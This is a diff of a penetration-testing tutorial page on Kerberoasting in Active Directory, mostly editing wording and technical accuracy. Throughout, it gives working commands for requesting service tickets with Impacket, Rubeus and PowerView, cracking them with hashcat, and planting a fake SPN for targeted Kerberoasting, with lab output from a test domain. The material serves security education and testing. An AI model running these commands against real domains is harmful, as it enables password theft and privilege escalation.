@@ -2,21 +2,21 @@
 title: "Kerberoasting"
 description: The classic AD privilege escalation technique to crack the passwords of service accounts offline
 categories: [Active Directory, Lateral Movement]
-tags: [Active Direcotory, Kerberoast, Lateral Movement, Privilege Escalation, Kerberoasting]
+tags: [Active Directory, Kerberoast, Lateral Movement, Privilege Escalation, Kerberoasting]
 weight: 2
 ---
 
 Kerberoasting is a privilege escalation technique for Active Directory credited to security researcher Tim Medin, who presented the attack back in 2014. The attack targets domain accounts with **Service Principal Names (SPN)**, which are unique identifiers that Kerberos uses to map a service to a domain service account in whose context the service is running.
 
 ## Theory
-Once the user completes pre-authentication, the Kerberos KDC (Key Distribution Center) issues the user a Ticket Granting Ticket (TGT). The user can then use the TGT to obtain a **service ticket** from the Ticket Granting Service (TGS) at the KDC. The service ticket is issued for a particular service principal, whose password hash is used to encrypt the service ticket. Users can then use the service ticket to authenticate to the service principal to access the service.
+After authenticating, the user obtains a Ticket Granting Ticket (TGT) from the Kerberos KDC (Key Distribution Center). The user can then use the TGT to obtain a **service ticket** from the Ticket Granting Service (TGS) at the KDC. The service ticket is issued for a particular service principal and encrypted with the associated account's long-term key (the NT hash for RC4, or a password-derived AES key). Users can then present the service ticket to authenticate to the service; authorization is checked separately.
 
-From an attacker's perspective, if we can obtain a valid TGT for any user on the domain, we could use it to obtain the service ticket. Then, we extract the encrypted portion and crack it offline to obtain the cleartext password of the service account, allowing us to authenticate to the domain as that service account.
+From an attacker's perspective, if we can obtain a valid TGT for a domain user, we can request service tickets for registered SPNs, subject to KDC policy. We can then extract the encrypted ticket data and test password guesses offline. A successful guess reveals the service account's password.
 
-Thus, the attack requires us to have access to a domain user, with any level of privileges within the domain. Additionally, there also must be at least one account with SPN configured other than the built-in `krbtgt` account that operates the KDC. The success of the attack depends on the strength of the password set in the service accounts we choose to attack.
+The usual workflow below requires domain credentials or a valid TGT and at least one account with an SPN other than the built-in `krbtgt` account used for TGTs. No administrative privileges are required. The success of password recovery depends on the strength of the service account's password.
 
 ## Attack from Linux
-The `GetUserSPNs.py` script from Impacket is great for enumerarting service accounts and Kerberoasting them. We can run the script with only the domain name, username, password and optionally the domain controller IP address specified using `-dc-ip`.
+The `GetUserSPNs.py` script from Impacket can enumerate service accounts and Kerberoast them. We can run the script with the domain name, username, password, and optionally the domain controller IP address specified using `-dc-ip`.
 ```bash
 GetUserSPNs.py -dc-ip 10.10.0.3 <domain>/<user>:<password>
 ```
@@ -32,16 +32,16 @@ MSSQLSvc/RA-CAILUM.GUNDAM.local:1433        svc_sql  CN=Group Policy Creator Own
 
 MSSQLSvc/RA-CAILUM.GUNDAM.local:SQLEXPRESS  svc_sql  CN=Group Policy Creator Owners,OU=Security Groups,DC=GUNDAM,DC=local  2025-06-06 00:13:47.605590  2026-04-07 16:16:56.632421
 ```
-We use `-request` option to request service ticket(s) and extract the encrypted portions.
+We use the `-request` option to request service tickets and extract the encrypted portions.
 ```bash
 GetUserSPNs.py -request -dc-ip 10.10.0.3 <domain>/<user>:<password>
 ```
-Optionally, we may request service ticket for a specific account using `-request-user`.
+Optionally, we may request a service ticket for a specific account using `-request-user`.
 ```bash
 GetUserSPNs.py -request -request-user <target_user> -dc-ip 10.10.0.3 <domain>/<user>:<password>
 ```
 
-`GetUserSPNs.py` automatically request tickets for the service account(s), and extracts the encrypted portion in JtR/hashcat format that be copied and cracked directly. We can also use `-outputfile` to specify a filename for `GetUserSPNs.py` to write the encrypted portions to.
+With `-request`, `GetUserSPNs.py` automatically requests tickets for the service accounts and extracts the encrypted portions in JtR/hashcat format that can be copied for offline cracking. We can also use `-outputfile` to specify a filename for the extracted data.
 ```txt
 ╭─brian@rx-93-nu ~
 ╰─$ GetUserSPNs.py -dc-ip 10.10.0.3 gundam.local/amuro.ray:Password1 -request
@@ -97,12 +97,12 @@ PS C:\research> .\Rubeus.exe kerberoast /nowrap
 [*] Hash                   : $krb5tgs$23$*svc_sql$GUNDAM.local$MSSQLSvc/RA-CAILUM.GUNDAM.local:1433*$[...]
 ```
 
-Rubeus also support using `/ldapfilter` option to target specific accounts. For example, we can use `'admincount=1'` option to target high-value accounts, or use `'samaccountname=svc_sql'` to target specific users.
+Rubeus also supports the `/ldapfilter` option to target specific accounts. For example, `admincount=1` selects accounts marked for administrative protection (including stale markers), while `samaccountname=svc_sql` selects a specific user.
 ```txt
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
 ```txt
-.\Rubeus.exe kerberoast /ldapfilter='samaccountname=svc_sql' /nowrap
+.\Rubeus.exe kerberoast /ldapfilter:'samaccountname=svc_sql' /nowrap
 ```
 
 ### Using PowerView
@@ -131,11 +131,11 @@ Hash                 : $krb5tgs$23$*svc_sql$GUNDAM.local$MSSQLSvc/RA-CAILUM.GUND
 ```
 
 ## Cracking Service Ticket
-With the service ticket obtained, hashcat can be used to crack the password for the target acount. We should note the encrypt algorithm used for the service ticket, which is indicated by its prefix. Kerberoasting tools like `GetUserSPNs.py` or `Rubeus` typically requests `RC4` when performing service ticket requests, and if accepted by the KDC, we get a service ticket starting with `$krb5tgs$23$*` (type 23). In that case, we may use mode **13100** to crack the ticket.
+With the service ticket obtained, hashcat can be used to test password guesses for the target account. Check the encryption algorithm indicated by the extracted data's prefix rather than assuming RC4; tool options, account settings, and KDC policy affect the result. For `$krb5tgs$23$*` (RC4, type 23), use mode **13100**.
 ```bash
 hashcat -m 13100 -O <service_ticket_file> <wordlist>
 ```
-In other instances where RC4 Encryption is disabled, we may receive ticket starting with `$krb5tgs$17$*` (type 17) or `$krb5tgs$18$*` (type 18), indicating the use of AES-128 and AES-256 encryption for the service ticket respectively. Cracking service tickets with AES encryption types are typically more time consuming than those with RC4 encryption, but not impossible.
+We may instead receive data starting with `$krb5tgs$17$` (type 17) or `$krb5tgs$18$` (type 18), indicating AES-128 and AES-256 encryption, respectively. Testing password guesses against AES service tickets is typically more time-consuming than against RC4 tickets, but not impossible.
 
 If you wish to proceed, hashcat mode **19600** can be used to crack type 17 TGS-REP, and mode **19700** to crack type 18 TGS-REP.
 ```bash
@@ -146,7 +146,7 @@ hashcat -m 19700 -O <service_ticket_file> <wordlist>
 ```
 
 ## Targeted Kerberoasting
-Targeted Kerberoasting is a type of Kerberoasting used to abuse ACLs over a user object. If the principal we control have `GenericWrite` or `GenericAll` access rights over a target user, or we have explicit `WriteProperty` permission on the targer user's `servicePrincipalName`, we may create a fake service principal name for the target user and Kerberoast it for the user's cleartext password.
+Targeted Kerberoasting abuses ACLs over a user object. If the principal we control has effective `GenericWrite` or `GenericAll` access over a target user, or explicit `WriteProperty` permission on the target user's `servicePrincipalName`, we may add a unique SPN and request a service ticket for offline password guessing.
 
 We can use PowerView function `Set-DomainObject` for this purpose.
 ```powershell
@@ -158,7 +158,7 @@ Alternatively, `bloodyAD` may be used from the Linux perspective.
 bloodyAD -d <domain> --host <dc_fqdn> -u <user> -p <password> set object <target_user> servicePrincipalName -v 'fake/SPN'
 ```
 
-From there on, we may Kerberoast the target user as if it was a normal service account.
+From there, we may Kerberoast the target user as if it were a normal service account. Preserve any existing SPNs and restore the original attribute values after the authorized test; `-SET` replaces the attribute's values.
 
 ## References and Further Reading
 - [Tim Medin's 2014 Derbycon Presentation on Kerberoasting](https://youtu.be/PUyhlN-E5MU?si=SUUTv9gF5XeDQ2qy)
